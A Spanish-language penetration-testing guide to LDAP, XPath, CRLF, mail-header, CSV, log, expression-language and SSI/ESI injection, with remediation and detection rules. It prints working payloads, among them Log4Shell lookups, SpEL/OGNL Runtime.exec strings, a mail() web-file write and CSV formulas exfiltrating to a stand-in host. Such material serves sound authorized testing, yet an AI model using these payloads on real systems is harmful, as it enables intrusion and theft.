# Otras inyecciones (LDAP, XPath, CRLF, cabeceras de correo, CSV, logs, lenguajes de expresiones, SSI/ESI)

| Clasificación | |
|---|---|
| CWE | CWE-90 LDAP Injection · CWE-643 XPath Injection · CWE-93 CRLF Injection · CWE-113 HTTP Response Splitting · CWE-88/CWE-93 en cabeceras y argumentos de correo · CWE-1236 CSV/Formula Injection · CWE-117 Improper Output Neutralization for Logs · CWE-917 Expression Language Injection · CWE-97 SSI Injection |
| OWASP Top 10:2025 | A05 — Injection (todas); la inyección en logs también afecta a A09 — Security Logging & Alerting Failures |
| OWASP API Top 10:2023 | Sin categoría propia |
| WSTG | WSTG-INPV-06 (LDAP) · WSTG-INPV-09 (XPath) · WSTG-INPV-10 (IMAP/SMTP) · WSTG-INPV-15 (HTTP Splitting/Smuggling) · WSTG-INPV-08 (SSI) · WSTG-INPV-11 (Code Injection, para EL) · CSV y logs no tienen sección propia |

**Contenido:** 1. Qué es (cada familia) · 2. Dónde buscar · 3. Detección segura · 4. Explotación: 4.1 LDAP · 4.2 XPath · 4.3 CRLF y división de respuestas · 4.4 Correo (cabeceras, `mail()`, SMTP) · 4.5 CSV/fórmulas · 4.6 Logs · 4.7 Lenguajes de expresiones (EL, SpEL, OGNL, MVEL, JEXL, lookups) · 4.8 SSI/ESI · 5. Evasión · 6. Escalada · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

Todas comparten la misma raíz que la inyección SQL: un dato del usuario se concatena en un **lenguaje o formato con sintaxis propia** sin escaparlo para ese contexto.

- **LDAP:** los filtros de búsqueda del directorio (`(&(uid=jdoe)(objectClass=person))`) usan `*`, `(`, `)`, `&`, `|`, `!`. Inyectar estos caracteres cambia la lógica (bypass de login, extracción de atributos).
- **XPath:** lenguaje para seleccionar nodos de un documento XML; se usa a veces como “base de datos” de usuarios o configuración. Mismo efecto que SQLi sobre XML.
- **CRLF / división de respuestas HTTP:** CR (`\r`, `%0d`) y LF (`\n`, `%0a`) separan cabeceras en HTTP/1.x. Si un dato llega a una cabecera de respuesta sin filtrarlos, el atacante añade cabeceras (`Set-Cookie`) o incluso un cuerpo nuevo (*response splitting*).
- **Inyección en correo:** los mensajes también son cabeceras separadas por CRLF (`To`, `Cc`, `Bcc`, `Subject`). Inyectar CRLF añade destinatarios o cambia el contenido; en PHP, el quinto parámetro de `mail()` pasa opciones a `sendmail` (inyección de argumentos).
- **CSV/fórmulas:** una celda exportada que empieza por `=`, `+`, `-` o `@` la interpreta Excel/LibreOffice/Google Sheets como fórmula cuando la víctima abre el fichero.
- **Logs:** CRLF o secuencias de escape en entradas que se registran permiten falsificar líneas, ocultar actividad o atacar el visor; con Log4j 2 vulnerable, los *lookups* `${…}` ejecutan código (Log4Shell).
- **Lenguajes de expresiones (EL):** Java EL, SpEL (Spring), OGNL (Struts, Confluence), MVEL, JEXL evalúan expresiones con acceso a clases Java; si el usuario controla la expresión, hay RCE.
- **SSI/ESI:** directivas que el servidor web (SSI) o una CDN/caché (ESI) procesan dentro del HTML (`<!--#exec -->`, `<esi:include>`).

## 2. Dónde buscar (señales del reconocimiento)

| Familia | Señales |
|---|---|
| LDAP | Login corporativo (intranets, VPN, portales con “usuario de dominio”), buscadores de empleados/directorio, autocompletado de usuarios, errores `javax.naming`, `LDAPException`, `Bad search filter`, `ldap_search(): Search: Bad search filter` |
| XPath | Aplicaciones que guardan usuarios o catálogos en XML, SOAP legacy, errores `XPathException`, `Invalid predicate`, `DOMXPath::query()` |
| CRLF | Parámetros reflejados en `Location` (redirecciones), `Set-Cookie` (idioma, tema), `Content-Disposition` (nombre de descarga), cabeceras propias (`X-Request-Id`), proxies que reenvían cabeceras, configuraciones Nginx con `$uri` en redirecciones |
| Correo | Formularios de contacto, “invitar a un amigo”, recuperación de contraseña con campo de nombre, newsletters, campos `from`, `reply_to`, `subject` en APIs |
| CSV | Cualquier exportación a CSV/XLSX con datos introducidos por usuarios (nombres, comentarios, direcciones) que consumen administradores |
| Logs | Campos que se registran (usuario en login fallido, `User-Agent`, `X-Forwarded-For`, `Referer`), paneles de auditoría, stack Java con Log4j |
| EL/OGNL/SpEL | Spring (Cloud Function, Gateway, Data), Struts 2, Confluence, JSF, motores de reglas y flujos (Activiti/Flowable, Drools), campos “expresión” o “fórmula” |
| SSI/ESI | Extensiones `.shtml`, `.stm`; cabeceras `Surrogate-Control: content="ESI/1.0"`, Varnish, Akamai, Fastly, Squid |

## 3. Detección segura (primeras sondas, no destructivas)

```text
LDAP     *                     → devuelve todos o “usuario válido”
         c0rvus*               → coincidencias por prefijo
         )  (  *)(            → error de filtro
XPath    '                     → error de sintaxis
         ' or '1'='1   vs  ' or '1'='2
CRLF     %0d%0aX-C0rvus:%201                      → cabecera nueva en la respuesta
         %0aX-C0rvus:%201                          → solo LF (muchos servidores lo aceptan)
Correo   c0rvus@DOMINIO_AUDITOR%0aCc:c0rvus2@DOMINIO_AUDITOR    → copia recibida (solo buzones del auditor)
CSV      =1337*7               → 9359 al abrir el CSV exportado
Logs     c0rvus%0d%0a[INFO] linea-falsa-c0rvus     → comprobar en el visor si el cliente da acceso
EL       ${1337*7}   #{1337*7}   %{1337*7}   ${{1337*7}}   → 9359
Log4j    ${jndi:dns://c0rvus.OAST/a}                → solo resolución DNS
SSI      <!--#echo var="DATE_LOCAL" -->            → fecha en la respuesta
ESI      c0<!--esi-->rvus                           → "c0rvus" si la CDN procesa ESI
```

## 4. Explotación por contexto o tecnología

### 4.1 LDAP

Filtro típico de login: `(&(uid=USUARIO)(userPassword=CLAVE))`.

```text
Usuario: *                              → (&(uid=*)(userPassword=…))           enumera / primer usuario
Usuario: admin)(&)                      → (&(uid=admin)(&))(userPassword=…))   el resto se ignora en algunos servidores
Usuario: admin)(|(uid=*                 → OR siempre verdadero
Usuario: *)(uid=*))(|(uid=*             → bypass clásico
Clave:   *                              → solo si la clave se compara en el filtro (y no con bind)
Usuario: admin%00                       → truncado en implementaciones antiguas (C)
```

Extracción ciega de atributos (oráculo: “usuario encontrado” o no):

```text
admin)(description=a*
admin)(description=ab*
*)(objectClass=user)(sAMAccountName=adm*          (Active Directory)
*)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local
*)(|(telephoneNumber=*)(mail=*
```

Atributos útiles para enumerar: `cn`, `mail`, `description`, `memberOf`, `sAMAccountName`, `userPrincipalName`, `pwdLastSet`. Nunca extraigas `userPassword`/`unicodePwd` aunque el filtro lo permita: demuestra el oráculo con un atributo inocuo.

**Inyección en DN** (cuando el usuario forma parte de un *Distinguished Name* para hacer `bind`): `ivan,ou=admins` o caracteres `,`, `+`, `=`, `\` cambian la entrada objetivo; escapar con reglas de DN, no de filtro.

### 4.2 XPath

Consulta típica: `//user[name/text()='USUARIO' and password/text()='CLAVE']`.

```text
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
admin' or '1'='1' and ''='           (rellenar según la consulta)
']|//*|//*['                          (unión de nodos: vuelca el documento)
')] | //user/*[contains(*,'
```

Extracción ciega:

```text
' and count(/*)=1 and '1'='1
' and string-length(name(/*[1]))=5 and '1'='1
' and substring(name(/*[1]),1,1)='u' and '1'='1
' and count(//user)=3 and '1'='1
' and string-length(//user[1]/password)=8 and '1'='1
' and substring(//user[name='c0rvus']/password,1,1)='a' and '1'='1
```

XPath 2.0/3.0 (Saxon, BaseX): `doc()` y `unparsed-text()` permiten SSRF/OOB y lectura de ficheros:

```text
' and doc(concat('http://c0rvus.OAST/',name(/*[1]))) and '1'='1
' and unparsed-text('file:///etc/hostname') and '1'='1
```

### 4.3 CRLF y división de respuestas HTTP

```http
GET /redirect?url=/home%0d%0aSet-Cookie:%20c0rvus=1 HTTP/1.1
GET /lang?l=es%0d%0aX-C0rvus:%201 HTTP/1.1
GET /lang?l=es%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a… HTTP/1.1   (división completa, servidores antiguos)
GET /lang?l=es%0d%0a%0d%0a<script>alert(document.domain)</script> HTTP/1.1               (cuerpo inyectado → XSS)
```

Variantes de codificación:

```text
%0d%0a   %0a   %0d   %0D%0A   %250d%250a (doble decodificación)   %u000d%u000a (IIS antiguo)
%E5%98%8A%E5%98%8D     (U+560A U+560D: algunas pilas truncaban a 0x0A/0x0D al convertir a Latin-1)
%c0%8a                 (UTF-8 sobrelargo, solo decodificadores laxos)
```

Casos modernos:

- **Nginx con `$uri`** en `return`/`rewrite` (`return 302 https://$host$uri;`): `$uri` está decodificado, así que `GET /%0d%0aX-C0rvus:%201` inyecta cabecera. Usar `$request_uri`.
- **HTTP/2 → HTTP/1.1** (*downgrade*): CRLF dentro de valores de cabecera H2 que el front-end reenvía en H1 ⇒ request smuggling (ver `vulns/request-smuggling.md`).
- **Peticiones salientes**: CRLF en una URL o cabecera que el servidor usa al llamar a otro servicio ⇒ inyección de comandos en Redis/Memcached/SMTP vía SSRF (ver `vulns/ssrf.md`).
- Impacto encadenado: fijación de sesión con `Set-Cookie`, XSS, envenenamiento de caché (`vulns/cache-poisoning-deception.md`), redirección abierta (`vulns/open-redirect.md`), desactivar CSP inyectando cabeceras antes.

### 4.4 Correo: cabeceras, `mail()` y SMTP

Solo con **direcciones controladas por el auditor**. ⚠️ Enviar correo a terceros o en volumen **requiere confirmación explícita del cliente**.

```text
nombre=C0rvus%0d%0aBcc:%20c0rvus-bcc@DOMINIO_AUDITOR
email=c0rvus@DOMINIO_AUDITOR%0aCc:c0rvus-cc@DOMINIO_AUDITOR
asunto=Hola%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<b>c0rvus</b>
email=c0rvus@DOMINIO_AUDITOR%0d%0a%0d%0aCuerpo%20reemplazado
```

JSON: `"email":"c0rvus@DOMINIO_AUDITOR\r\nBcc: c0rvus-bcc@DOMINIO_AUDITOR"`.

**PHP `mail()` con quinto parámetro** (`additional_parameters`, p. ej. `-f$from`): inyección de argumentos de sendmail (PHPMailer CVE-2016-10033 y sucesores).

```text
from=c0rvus@DOMINIO_AUDITOR -OQueueDirectory=/tmp -X/var/www/html/c0rvus.php     ⚠️ escribe un fichero: requiere confirmación explícita del cliente
"c0rvus\" -oQ/tmp -X/var/www/html/c0.php c0"@DOMINIO_AUDITOR                       ⚠️ variante con dirección entrecomillada
```

**Inyección de comandos SMTP** (clientes que construyen el diálogo SMTP a mano): `c0rvus@DOMINIO_AUDITOR>%0d%0aRCPT TO:<c0rvus2@DOMINIO_AUDITOR`. **SMTP smuggling** (2023, CVE-2023-51764 Postfix, CVE-2023-51765 Sendmail, CVE-2023-51766 Exim): secuencias de fin de datos no estándar (`\n.\n`) que un servidor ignora y otro interpreta, permitiendo colar un segundo mensaje con remitente falsificado; se prueba con herramientas específicas y solo contra servidores en alcance.

**IMAP** (webmails, WSTG-INPV-10): parámetros de buzón o ID de mensaje con CRLF y comandos (`INBOX%0d%0aA1 CAPABILITY`).

### 4.5 CSV / inyección de fórmulas

Introduce el valor en un campo que luego se exporte y ábrelo en una hoja de cálculo **del auditor**:

```text
=1337*7
+1337*7
-1337+9360
@SUM(1337*7)
=HYPERLINK("https://c0rvus.OAST/?d="&A2,"Ver detalle")       ← exfiltra la celda A2 al hacer clic
=IMPORTXML(CONCAT("https://c0rvus.OAST/?d=",A2),"//a")        ← Google Sheets: exfiltración sin clic tras aceptar el aviso
=WEBSERVICE("https://c0rvus.OAST/c0")                         ← Excel (Windows), según versión/políticas
%0A=1337*7   \t=1337*7   ";=1337*7                             ← prefijos para evadir filtros que miran el primer carácter
```

⚠️ DDE (`=cmd|' /C calc'!A0`) ejecuta programas en el equipo de quien abre el fichero tras avisos; es un ataque al usuario final: **requiere confirmación explícita del cliente** y usar solo una calculadora o similar en un equipo del auditor.

Severidad habitualmente baja o informativa: requiere que una víctima abra el fichero y acepte advertencias. Sube cuando la exportación la consumen administradores o se importa automáticamente en Google Sheets.

### 4.6 Inyección en logs

```text
usuario=c0rvus%0d%0a2026-11-24T10:00:00Z INFO login correcto usuario=admin ip=10.0.0.1     ← línea falsa
usuario=c0rvus%1b[2J%1b[H                                                                   ← borrar pantalla en terminal (ANSI)
usuario=c0rvus%1b]8;;https://c0rvus.OAST/%1b\\clic%1b]8;;%1b\\                              ← hiperenlace en terminales modernos
User-Agent: <img src=x onerror=alert(document.domain)>                                      ← XSS en el visor de logs (ver xss.md)
```

**Log4Shell** (Log4j 2.0-beta9 a 2.14.1, CVE-2021-44228; variantes CVE-2021-45046 y CVE-2021-44832). Sonda solo DNS en cabeceras y campos que se registran:

```text
${jndi:dns://c0rvus.OAST/a}
${jndi:ldap://${hostName}.c0rvus.OAST/a}                 ← nombre del host en el subdominio
${${lower:j}ndi:${lower:d}ns://c0rvus.OAST/a}            ← evasión
${${::-j}${::-n}${::-d}${::-i}:dns://c0rvus.OAST/a}
${j${env:C0:-n}di:dns://c0rvus.OAST/a}
```

Puntos de inyección: `User-Agent`, `X-Forwarded-For`, `Referer`, `X-Api-Version`, cabeceras de autenticación, usuario de login, parámetros de búsqueda. ⚠️ Servir una clase Java por LDAP para ejecutar código **requiere confirmación explícita del cliente**; la resolución DNS con el hostname ya prueba la vulnerabilidad.

### 4.7 Lenguajes de expresiones (EL, SpEL, OGNL, MVEL, JEXL, lookups)

Detección: `${1337*7}`, `#{1337*7}`, `%{1337*7}`, `*{1337*7}`, `${"c0".concat("rvus")}`.

**Java EL / Jakarta EL (JSP, JSF):**

```text
${pageContext.request.serverName}            ${applicationScope}            ${header}
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"nslookup c0rvus.OAST")}
```

**SpEL (Spring):**

```text
T(java.lang.Runtime).getRuntime().exec('nslookup c0rvus.OAST')
new java.lang.ProcessBuilder({'id'}).start()
T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream(),T(java.nio.charset.Charset).forName('UTF-8'))
#{@environment.getProperty('spring.datasource.url')}          ← fuga de configuración sin RCE
```

CVE de referencia: Spring Cloud Function CVE-2022-22963 (cabecera `spring.cloud.function.routing-expression`), Spring Cloud Gateway CVE-2022-22947 (rutas vía actuator), Spring Data Commons CVE-2018-1273.

```http
POST /functionRouter HTTP/1.1
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("nslookup c0rvus.OAST")
```

**OGNL (Struts 2, Confluence):**

```text
%{1337*7}
${@java.lang.Runtime@getRuntime().exec('nslookup c0rvus.OAST')}
%{(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream(),'UTF-8'))}
```

CVE de referencia: Struts S2-045 (CVE-2017-5638, OGNL en `Content-Type`), Confluence CVE-2022-26134 (OGNL en la URI) y CVE-2023-22527 (inyección en plantillas con OGNL).

**MVEL / JEXL / Groovy en motores de reglas:**

```text
MVEL:  Runtime.getRuntime().exec("nslookup c0rvus.OAST")
JEXL:  ''.class.forName('java.lang.Runtime').getRuntime().exec('nslookup c0rvus.OAST')
```

**Apache Commons Text** (`StringSubstitutor` con interpoladores por defecto, 1.5–1.9, CVE-2022-42889 “Text4Shell”):

```text
${dns:address|c0rvus.OAST}                       ← solo DNS, detección segura
${url:UTF-8:http://c0rvus.OAST/c0}               ← petición HTTP
${script:javascript:java.lang.Runtime.getRuntime().exec('id')}    ⚠️ ejecución (requiere motor JS en el JDK)
```

### 4.8 SSI y ESI

```html
<!--#echo var="DATE_LOCAL" -->                 detección
<!--#printenv -->                              fuga de variables de entorno
<!--#include virtual="/index.html" -->         inclusión
<!--#exec cmd="id" -->                         ⚠️ ejecución si Options +Includes con exec
```

ESI (cachés y CDN):

```html
c0<!--esi-->rvus                                         ← "c0rvus" si se procesa ESI
<esi:include src="http://c0rvus.OAST/esi"/>              ← SSRF desde la caché
<esi:include src="/perfil"/>                             ← incluir contenido de otro usuario en caché
<esi:vars>$(HTTP_COOKIE{'session'})</esi:vars>           ← fuga de cookies HttpOnly (según implementación)
```

## 5. Evasión de filtros y WAF

- **LDAP:** codificación hexadecimal de filtro (`\2a` = `*`, `\28` = `(`, `\29` = `)`) cuando la aplicación decodifica antes de escapar; mayúsculas en atributos; espacios entre paréntesis.
- **XPath:** funciones en lugar de comparadores (`contains()`, `starts-with()`, `translate()`), comillas dobles si se filtran simples, `concat()` para construir cadenas.
- **CRLF:** solo `%0a`, `%0d`, doble codificación, Unicode que se pliega a CR/LF, caracteres en la ruta en lugar de la query, cabeceras con *line folding* (`%0d%0a%20`) en servidores antiguos.
- **Correo:** solo `\n`, codificación MIME de cabeceras (`=?UTF-8?B?…?=`) si se decodifica antes de validar, comas y punto y coma para múltiples destinatarios sin CRLF (`a@x.com,b@y.com`).
- **CSV:** prefijos `%0A`, `\t`, `"`, `;`, `,` antes del `=`; funciones alternativas; cadenas en otras celdas referenciadas.
- **EL/Log4j:** anidación de lookups (`${lower:}`, `${::-x}`, `${env:X:-y}`), troceo de cadenas (`"java.l"+"ang.Runtime"`), `T(java.lang.Character).toString(105)`.
Ver `vulns/waf-bypass.md`.

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

- **LDAP/XPath:** bypass de autenticación con cuenta de prueba → enumeración de grupos privilegiados (recuento, no listados masivos) → acceso con rol elevado si el filtro decide el rol.
- **CRLF:** `Set-Cookie` → fijación de sesión (`vulns/session.md`); cuerpo inyectado → XSS; combinado con caché → XSS persistente para todos (`vulns/cache-poisoning-deception.md`; ⚠️ envenenar una caché de producción **requiere confirmación explícita del cliente**, usa *cache busters*).
- **Correo:** spam/phishing desde el dominio legítimo del cliente (impacto reputacional, SPF/DKIM válidos); demostrarlo con un único correo a un buzón del auditor.
- **CSV:** exfiltración de otras celdas del informe hacia OAST.
- **Logs:** ocultar un ataque (líneas falsas), XSS almacenado en el panel de administración, RCE con Log4Shell.
- **EL/OGNL/SpEL:** RCE → ver `vulns/cmdi-rce.md` §6.
- **ESI:** SSRF desde la CDN y robo de cookies `HttpOnly`.

## 7. Caja blanca: fuentes, sumideros y patrones de código

**LDAP**
```java
// Vulnerable
ctx.search("ou=people,dc=ej,dc=com", "(&(uid=" + user + ")(objectClass=person))", ctls);
// Seguro: filtro con argumentos {0}, JNDI los escapa
ctx.search("ou=people,dc=ej,dc=com", "(&(uid={0})(objectClass=person))", new Object[]{ user }, ctls);
// Spring LDAP: LdapQueryBuilder.query().where("uid").is(user)
```
```csharp
searcher.Filter = "(sAMAccountName=" + user + ")";             // vulnerable
searcher.Filter = $"(sAMAccountName={LdapEscape(user)})";       // escapar \ * ( ) NUL
```
```php
ldap_search($c, $base, "(uid=" . ldap_escape($user, "", LDAP_ESCAPE_FILTER) . ")");   // DN: LDAP_ESCAPE_DN
```
```python
from ldap3.utils.conv import escape_filter_chars
conn.search(base, f"(uid={escape_filter_chars(user)})")
```
Go: `ldap.EscapeFilter(user)` (go-ldap). Node (ldapjs): construir con `new EqualityFilter({attribute:'uid', value:user})`. Ruby (net-ldap): `Net::LDAP::Filter.eq('uid', user)`.

**XPath**
```java
xpath.evaluate("//user[name='" + n + "']", doc);                               // vulnerable
xpath.setXPathVariableResolver(v -> v.getLocalPart().equals("n") ? n : null);
xpath.evaluate("//user[name=$n]", doc);                                         // seguro
```
```python
tree.xpath("//user[name=$n]", n=name)       # lxml con variables
```
.NET: `XPathExpression` con `XsltContext` personalizado para variables; PHP `DOMXPath::query` no admite variables: validar con lista blanca o escapar comillas construyendo `concat()`.

**CRLF / cabeceras**
```python
# Vulnerable (frameworks antiguos o servidores propios)
resp.headers["Location"] = request.args["next"]
# Seguro
if any(c in value for c in "\r\n"): abort(400)      # y además lista blanca de destinos (open-redirect.md)
```
La mayoría de pilas actuales rechazan CR/LF en valores de cabecera (Node lanza `ERR_INVALID_CHAR`, PHP `header()` impide varias cabeceras en una llamada, Tomcat/Jetty los rechazan); el riesgo vive en servidores propios, sockets crudos, proxies, Nginx con `$uri` y clientes HTTP salientes antiguos.

**Correo**
```php
mail($to, $subject, $body, "From: " . $_POST['email']);                 // vulnerable (cabeceras)
mail($to, $subject, $body, $headers, "-f" . $_POST['email']);          // vulnerable (argumentos)
// Seguro: librería (Symfony Mailer, PHPMailer actual) + validación estricta de dirección
$email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL) ?: exit;
```
```python
msg = EmailMessage(); msg["Reply-To"] = user_email     # la política por defecto rechaza CR/LF en cabeceras
```
Java (Jakarta Mail): `new InternetAddress(addr, true)` valida; nunca concatenar en `setHeader`. Node: Nodemailer normaliza cabeceras; validar igualmente.

**CSV**
```python
DANGEROUS = ("=", "+", "-", "@", "\t", "\r", "\n")
def csv_safe(v: str) -> str:
    v = str(v)
    return "'" + v if v.startswith(DANGEROUS) else v
writer = csv.writer(f, quoting=csv.QUOTE_ALL)
writer.writerow([csv_safe(x) for x in row])
```

**Logs**
```java
log.info("Login fallido para " + user);                          // vulnerable a CRLF (y Log4Shell si Log4j < 2.17.1)
log.info("Login fallido para {}", user.replaceAll("[\\r\\n]", "_"));   // seguro + layout JSON estructurado
```
Usa logs estructurados (JSON) que escapan saltos de línea, codifica en el visor (HTML) y elimina secuencias de escape ANSI antes de mostrar en terminal.

**EL / SpEL / OGNL**
```java
// Vulnerable
new SpelExpressionParser().parseExpression(userInput).getValue(new StandardEvaluationContext());
ExpressionFactory.newInstance().createValueExpression(elCtx, userInput, Object.class);
// Seguro: no evaluar expresiones del usuario; si es imprescindible, SimpleEvaluationContext (sin T(), sin constructores)
Expression e = parser.parseExpression(regla_de_confianza);
e.getValue(SimpleEvaluationContext.forReadOnlyDataBinding().build(), datos);
```

**Búsqueda (ripgrep / semgrep)**

```bash
rg -n --pcre2 '\.search\([^)]*"\s*\(\w+=\s*"\s*\+|DirectorySearcher|\.Filter\s*=\s*.*\+|ldap_search\(' 
rg -n --pcre2 'xpath\.(evaluate|compile)\([^)]*\+|->query\(\s*["\x27][^"\x27]*["\x27]\s*\.\s*\$|SelectNodes\([^)]*\+'
rg -n --pcre2 '(setHeader|addHeader|header)\(\s*["\x27](Location|Set-Cookie|Content-Disposition)' 
rg -n --pcre2 'return\s+30[12]\s+[^;]*\$uri' -g '*.conf'                       # Nginx
rg -n --pcre2 '\bmail\s*\([^;]*\$_(GET|POST|REQUEST)' --type php
rg -n --pcre2 'parseExpression\(|StandardEvaluationContext|createValueExpression|OgnlUtil|Ognl\.(getValue|parseExpression)|MVEL\.eval|JexlEngine|StringSubstitutor\.createInterpolator' --type java
rg -n --pcre2 'log4j-core.*2\.(0|1[0-6]|17\.0)\b' -g 'pom.xml' -g '*.gradle' -g '*.lock'
rg -n --pcre2 '\.csv|text/csv|csv\.writer|fputcsv|CsvWriter'                   # revisar escape de fórmulas
semgrep --config p/owasp-top-ten --config p/java --config p/php .
```

## 8. Falsos positivos frecuentes

- **LDAP/XPath:** `*` que funciona porque la búsqueda es de comodines por diseño (directorio público); confirma que altera la **lógica** (bypass, atributo oculto).
- **CRLF:** la cadena aparece codificada dentro de una cabecera (`Location: /home%0d%0aX-…`) o el navegador/Burp “parece” mostrar una cabecera nueva por el renderizado; revisa los bytes crudos de la respuesta.
- **Correo:** el CRLF se elimina y la dirección queda inválida; o el `Bcc` aparece literal en el cuerpo (no es inyección).
- **CSV:** la hoja muestra la fórmula como texto (ya escapada) o solo se ejecuta tras aceptar avisos que el cliente considera control suficiente.
- **Log4Shell:** interacción DNS desde un WAF/IDS que analiza el payload, no desde la aplicación; verifica IP de origen y el `${hostName}` resuelto.
- **EL:** `9359` calculado por JavaScript en el navegador o por una calculadora legítima.

## 9. Evidencia mínima para validarlo

- Petición y respuesta crudas (bytes) con la sonda y su efecto: cabecera inyectada, filtro alterado, valor `9359`, correo recibido en buzón del auditor con cabeceras completas, interacción OAST.
- Para ciegas (LDAP/XPath): dos o tres peticiones que muestren el oráculo y un dato inocuo obtenido.
- Para CSV: captura de la hoja del auditor mostrando `9359` o la petición OAST desde la hoja.
- Para logs: línea falsificada visible en el visor (si el cliente lo facilita) o, si no, código/configuración que lo confirma.

## 10. Severidad orientativa

| Caso | CVSS 3.1 | CVSS 4.0 (calcular con FIRST) |
|---|---|---|
| EL/OGNL/SpEL o Log4Shell con RCE sin autenticación | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8) | `AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` (≈9.3) |
| LDAP/XPath: bypass de autenticación | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` (9.1) | `…/VC:H/VI:H/VA:N/…` |
| LDAP/XPath: extracción de atributos del directorio | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (7.5) | `…/VC:H/VI:N/VA:N/…` |
| CRLF → XSS o fijación de sesión | `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` (6.1) | `AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N` |
| Inyección de cabeceras de correo (spam desde el dominio) | `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N` (5.3) | `…/VC:N/VI:L/VA:N/…` |
| `mail()` con escritura de fichero → RCE | como RCE | como RCE |
| CSV/fórmulas | `AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N` (4.6) o informativa | `…/PR:L/UI:A/…/VC:L/VI:L/…` |
| Falsificación de logs sin otro impacto | `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N` (5.3) | `…/VC:N/VI:L/VA:N/…` |
| ESI → SSRF / robo de cookies | según impacto demostrado (ver `vulns/ssrf.md`, `vulns/xss.md`) | |

## 11. Remediación

1. **Escapar según el contexto de destino** con funciones de la librería (filtro LDAP vs DN, variables XPath, APIs de cabeceras que rechazan CR/LF).
2. **Parametrizar** cuando exista (JNDI `{0}`, variables XPath, builders de filtros).
3. **Validar** formatos estrictos: correos con validador RFC + rechazo de CR/LF; identificadores con listas blancas.
4. **No evaluar expresiones del usuario**; si hay reglas configurables, usar `SimpleEvaluationContext`, sandbox o un lenguaje propio limitado; actualizar Struts, Confluence, Spring y Commons Text.
5. **Log4j ≥ 2.17.1** (o 2.12.4 / 2.3.2 en ramas antiguas), logs estructurados, codificación en visores.
6. **CSV:** prefijar con `'` las celdas que empiezan por `= + - @ \t \r` y entrecomillar todos los campos; ofrecer XLSX generado con tipos “texto”.
7. **Infraestructura:** desactivar SSI `exec` (`Options -Includes` o `IncludesNOEXEC`), desactivar ESI donde no se use o restringirlo a orígenes de confianza; Nginx con `$request_uri`.

## 12. Herramientas

- **Burp Suite** (Repeater, Intruder con listas de PayloadsAllTheThings para LDAP, XPath, CRLF, CSV), **Collaborator/interactsh** para Log4j, EL, ESI y XPath 2.0.
- **crlfuzz**: `crlfuzz -u "https://objetivo/" -s` (tras detección manual, sin barridos masivos).
- **xcat** (XPath ciega): `xcat run https://objetivo/login user user=admin --true-string "Bienvenido"` (comprobar sintaxis en la versión instalada).
- **log4j-scan** (FullHunt) y la plantilla de **nuclei** para CVE-2021-44228, siempre con DNS propio y alcance acotado.
- **SMTP Smuggling Tools** (SEC Consult) para pruebas autorizadas contra MTAs en alcance.
- **semgrep**, **CodeQL** (`java/ldap-injection`, `java/xml/xpath-injection`, `java/spel-expression-injection`, `java/ognl-injection`, `java/log-injection`).

## 13. Referencias

- OWASP WSTG: LDAP (INPV-06), XPath (INPV-09), IMAP/SMTP (INPV-10), HTTP Splitting/Smuggling (INPV-15), SSI (INPV-08): https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Tests/07-Input_Validation_Testing/
- OWASP LDAP Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
- OWASP CSV Injection: https://owasp.org/www-community/attacks/CSV_Injection
- OWASP Logging Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
- PortSwigger Research: “Server-side template injection” (incluye EL) y Web Security Academy (HTTP request smuggling, CRLF en HTTP/2).
- PayloadsAllTheThings: LDAP Injection, XPATH Injection, CRLF Injection, CSV Injection, Server Side Include Injection: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks: LDAP Injection, XPATH Injection, CRLF (%0D%0A) Injection, Formula/CSV Injection, SSI/ESI Injection, EL Injection: https://book.hacktricks.wiki/
- GoSecure — “Beyond XSS: Edge Side Include Injection” (2018).
- Apache Log4j Security Vulnerabilities: https://logging.apache.org/log4j/2.x/security.html
- SEC Consult — SMTP Smuggling (2023).
- CWE-90, CWE-643, CWE-93, CWE-113, CWE-1236, CWE-117, CWE-917, CWE-97 en https://cwe.mitre.org
- Relacionados: `vulns/cmdi-rce.md`, `vulns/ssti.md`, `vulns/xss.md`, `vulns/request-smuggling.md`, `vulns/cache-poisoning-deception.md`, `vulns/open-redirect.md`, `vulns/session.md`, `vulns/ssrf.md`, `vulns/authentication.md`.
